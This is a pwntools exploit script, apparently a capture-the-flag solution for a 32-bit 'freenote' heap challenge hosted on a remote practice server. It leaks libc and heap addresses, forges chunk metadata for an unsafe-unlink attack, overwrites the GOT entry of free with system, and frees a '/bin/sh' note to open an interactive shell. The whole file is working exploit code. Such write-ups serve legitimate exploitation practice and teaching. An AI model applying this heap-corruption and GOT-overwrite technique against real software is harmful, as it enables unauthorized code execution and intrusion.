from pwn import *
context.log_level='debug'
debug=0

if debug==1 :
	io=process('./freenote_x86',env={'LD_PRELOAD':'/lib/i386-linux-gnu/libc-2.23.so'})
	elf=ELF('./freenote_x86')
	libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
else :
	io=remote('node3.buuoj.cn',28126)
	elf=ELF('./freenote_x86')
	libc=ELF('../../i386libc/x86_libc.so.6')

def add(a,b):
	io.sendlineafter('Your choice: ','2')
	io.sendlineafter('Length of new note: ',str(a))
	b+='a'*(a-len(b))
	io.sendafter('Enter your note: ',b)

def show():
	io.sendlineafter('Your choice: ','1')

def edit(a,b,c):
	io.sendlineafter('Your choice: ','3')
	io.sendlineafter('Note number: ',str(a))
	io.sendlineafter('Length of note: ',str(b))
	c+='a'*(b-len(c))
	io.sendafter('Enter your note: ',c)

def delete(a):
	io.sendlineafter('Your choice: ','4')
	io.sendlineafter('Note number: ',str(a))

add(0x20,'aaaa')
add(0x20,'aaaa')
add(0x20,'aaaa')
add(0x20,'aaaa')

#pay=p32(0)+p32(0x80)+
#edit(0,0x)
delete(0)
delete(2)
add(1,'0')
show()
recv=io.recvuntil('1. ')
libc_base=u32(recv[3:7])-0x01b0730
heap_base=u32(recv[7:11])-0xd28
log.success('libc_base:'+hex(libc_base))
log.success('heap_base:'+hex(heap_base))
delete(0)
delete(1)
delete(3)
pay=p32(0)+p32(0x81)+p32(heap_base+0x18-12)+p32(heap_base+0x18-8)
pay=pay.ljust(0x80,'A')# chunk0 
pay+=p32(0x80)+p32(0x80)                             
pay=pay.ljust(0x100,"A")#chunk1 
add(len(pay),pay)
delete(1)
pay=p32(2)+p32(1)+p32(4)+p32(elf.got['free'])+p32(1)+p32(8)+p32(heap_base+0xca8)
pay=pay.ljust(0x80*2,'\x00')
system_addr=libc_base+libc.symbols['system']
edit(0,len(pay),pay)
edit(0,4,p32(system_addr))
edit(1,8,'/bin/sh\x00')
delete(1)
#gdb.attach(io)
#pause()
io.interactive()